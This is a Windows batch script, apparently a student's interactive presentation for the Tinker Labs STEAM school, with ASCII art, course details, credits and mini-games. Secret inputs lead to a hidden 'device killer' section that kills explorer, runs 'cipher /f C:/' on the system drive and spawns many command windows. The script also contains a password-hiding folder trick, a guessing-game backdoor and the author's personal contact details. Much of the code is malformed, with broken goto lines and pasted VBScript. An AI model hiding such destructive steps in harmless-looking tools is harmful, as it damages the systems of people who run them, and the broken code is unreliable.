@echo off
:Start2
cls
goto Start
color 0
:Start
color 0
title tinker labs presentation
echo this is presentation for tinker labs 
echo -----------------------------------------------------------------
echo this presetation is interactive(you can skip credits part!)
echo -----------------------------------------------------------------
echo 1) tinker labs heart
echo 2) presentation
echo 3) exit
echo 4) credits
echo 5) developer's comment
echo 6) reason
echo 7) tinker logo
echo 8) read me
echo Input your choice
set input=
set /p input= Choice: 
if %input%==1 goto A if NOT goto Start2
if %input%==2 goto B if NOT goto Start2
if %input%==3 goto C if NOT goto Start2
if %input%==4 goto D if NOT goto Start2
if %input%==dev goto L if NOT goto Start2
if %input%==5 goto dev if NOT goto Start2
if %input%==gost goto gost if NOT goto Start2
if %input%==debug goto ll if NOT goto Start2
if %input%==device killer goto Dvklr if NOT goto Start2
if %input%==6 goto rsn if NOT goto Start2
if %input%==7 goto lgo if NOT goto Start2
if %input%==8 goto rdm if NOT goto Start2 
:dev
cls
echo this is almost best i can build
echo it has a LOT of secrets like dev or gost
echo i maked them as secrets because they can make changes
echo to the device!
echo this can't be only so this is mow full
echo i will make updates daily so be happy to se changes!
:A
cls
echo      #         #
echo     ###       ###
echo    #####     #####          
echo  ##################
echo ### tinker labs ####
echo  #################
echo   ###############
echo    ############
echo     #########
echo      #######
echo       #####
echo        ###
echo         #
echo this is heart for tinker labs!!!
echo -------------------------------------------------------------------
echo i think you will enjoy next part of presentation!!!
echo -------------------------------------------------------------------
echo Now choose what you want to do. 
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice: 
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:Exit
exit
:B
cls
echo in tinker labs you learn about:science,technology,engineering,art and math(S.T.E.A.M)
echo playing,learning,fun,challanges,homework in tinker labs all that is included
echo for not so big price:100 kn per month ONLY
echo in tinker labs is 8 courses
echo 10 students what a want to say you can get 10 new
echo frends per year
echo 40 lessons per month
echo 150 experiment per month
echo 200 STEAM concepts per month
echo locations:bjelovar,cakovec,dakovo
echo ivanec,koprivnica,nasice
echo osijek,pozega,rijeka
echo slavonski brod,split,varazdin
echo vinkovci,zagreb
echo (slavonski brod is mine home town!)
echo you can find more locations at https://tinkerlabs.hr/lokacije/
echo 
echo ----------------------------------------------------------------------
echo Now choose what you want to do. 
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice: 
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:C
cls
exit
:D
cls
echo development by Maksim Tall
echo designed by Maksim Tall
echo for tinker labs
echo inspired by chm tech
echo created with visual studio code
echo sourse code by chm tech(edited pasword generator code)
echo ------------------------------------------------------------------------------------------------
echo Now choose what you want to do. 
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice: 
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:L
cls
color 2
echo developer menu
echo welcome Maksim Tall
title developer menu
echo what you want  to do?
echo --------------------------------------------------------------
echo 1) tinker labs heart
echo 2) presentation
echo 3) exit
echo 4) credits
echo 5) create lock folder
echo 6) power settings
echo 7) guessing game
echo 8) talk
echo 9) matrix code
echo 10) help
echo -----------------------------------------------------------------
echo Input your choice
set input=
set /p input= Choice: 
if %input%==1 goto A if NOT goto Start2
if %input%==2 goto B if NOT goto Start2
if %input%==3 goto C if NOT goto Start2
if %input%==4 goto D if NOT goto Start2
if %input%==5 goto F if NOT goto Start2
if %input%==6 goto P if NOT goto Start2
if %input%==7 goto G if NOT goto Start2
if %input%==8 goto T if NOT goto Start2
if %input%==9 goto H if NOT goto Start2
:F
cls
echo password is locked!!
Quote:
Quote: cls
@ECHO OFF
title Folder lock
if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK
if NOT EXIST lock goto MDLOCKER
:CONFIRM
echo Are you sure you want to lock the folder(Y/N)
set/p "cho=>"
if %cho%==Y goto LOCK
if %cho%==y goto LOCK
if %cho%==n goto END
if %cho%==N goto END
echo Invalid choice.
goto CONFIRM
:LOCK
ren Private "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
echo Folder locked
goto End
:UNLOCK
echo Enter password to unlock folder
set/p "pass=>"
if NOT %pass%== locked goto FAIL
attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" lock
echo Folder Unlocked successfully
goto End
:FAIL
echo Invalid password
goto end
:MDLOCKER
md lock
echo lock folder created successfully
goto End
:End
cls
exit
:P
cls
echo here are some power settings:
echo 1) shutdown
echo 2) restart
if %input%==1 goto shutdown -s if NOT goto Start2
if %input%==2 goto shutdown -r if NOT goto Start2
:G
cls
@echo off
color 0e
title Guessing Game by Maksim Tall
set /a guessnum=0
set /a answer=%RANDOM%
set variable1=surf33
echo -------------------------------------------------
echo Welcome to the Guessing Game! 
echo. 
echo Try and Guess my Number! 
echo -------------------------------------------------
echo. 
:top
echo. 
set /p guess=
echo. 
if %guess% GTR %answer% ECHO Lower! 
if %guess% LSS %answer% ECHO Higher! 
if %guess%==%answer% GOTO EQUAL
set /a guessnum=%guessnum% +1
if %guess%==%variable1% ECHO Found the backdoor hey?, the answer is: %answer%
goto top
:equal
echo Congratulations, You guessed right!!! 
echo. 
echo It took you %guessnum% guesses. 
echo. 
pause
:S
cls
Dim message, sapi
message=InputBox("What do you want me to say?","Speak to Me")
Set sapi=CreateObject("sapi.spvoice")
sapi.Speak messange
:T
cls
@echo off
:a
color 2
echo 1 1 1 0 1 0 0 0 1 1 1 1 0 0 0 1 1 0 0 1 0 0 0 1 1 0 1 0 1 0 0 0 1 1 1 1
ping localhost -n 1 > nul
echo 1 1 0 1 1 1 0 0 0 1 0 1 a f h 0 0 0 1 0 1 1 0 0 1 1 1 0 0 1 0 1 0 0 1 1 0
echo 1 0 0 1 1 0 9 8 1 2 0 1 9 9 2 1 1 1 0 0 1 0 1 1 1 0 1 1 0 1 0 0 0 1 0 1 1
ping localhost -n 1 > nul
echo 0 1 0 0 0 1 0 0 0 1 0 0 0 1 0 1 0 0 1 0 1 0 1 1 0 1 0 0 0 01 0 1 0 0 1 0
ping localhost -n 1 > nul
echo 1 0 1 1 1 0 1 1 0 9 1 1 2 1 1 0 9 1 0 5 7 7 8 7 8 1 3 2 1 2 1 2 3 2 1 3 4
ping localhost -n 1 > nul
echo 1 1 1 0 1 0 0 1 0 0 0 1 1 1 0 0 1 1 1 4 1 2 1 1 2 0 1 0 1 2 2 1 0 1 1 0 1
goto a
:H
cls
echo e-mail:maks.tall0@gmail.com
echo num:0955497203
echo -------------------------------------------------
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice: 
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:gost
cls
title tinker labs presentation
echo this is presentation for tinker labs 
echo -----------------------------------------------------------------
echo this presetation is interactive(you can skip credits part!)
echo -----------------------------------------------------------------
echo 1) tinker labs heart
echo 2) presentation
if %input%==1 goto A if NOT goto Start2
if %input%==2 goto B if NOT goto Start2
:ll
cls
echo welcome to debug mode
echo werify code
set input=
if %input%==28030607 goto rldbg if NOT goto Start2
:rldbg
cls
echo welcome
taskkill cmd
taskkill explorer
:Dvklr
cls
title device killer
echo do you want to destroy your device?(y/n)
echo hahahahhahahahha
taskkill explorer
cipher /f  C:/
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
:rsn
cls
title reason for this
echo i maded this for tinker labs!
echo i want to say thanks for showing a lot of
echo things to me and my frends
echo i love tinker labs and i think everyone enjoyed tinker labs
echo so at the end i maded this to show how much i
echo enjoyed tinker labs
:lgo
cls
echo ###################################################################
echo ##########              ################         ##################
echo #############       ####################         ##################
echo #############       ####################         ##################
echo #############       ####################         ##################
echo #############       ####################         ##################
echo #############       ####################         ################## 
echo #############       ####################                         ##
echo #############       ####################                         ##
echo ###################################################################
echo
echo
echo
echo
echo        #############
echo           ######
echo           ######
echo           ######
echo           ######
echo           ######
echo           ######
echo
echo
echo           ######
echo           ######
echo           ######
echo           ######
echo           ######
echo           ######
echo           #################
echo           #################
:rdm
cls
echo nothing here to see
echo i don't know why you still here
echo just move away
echo i'm scared
echo ok,if you don't go i will report you to developer
echo move because ... i'm shy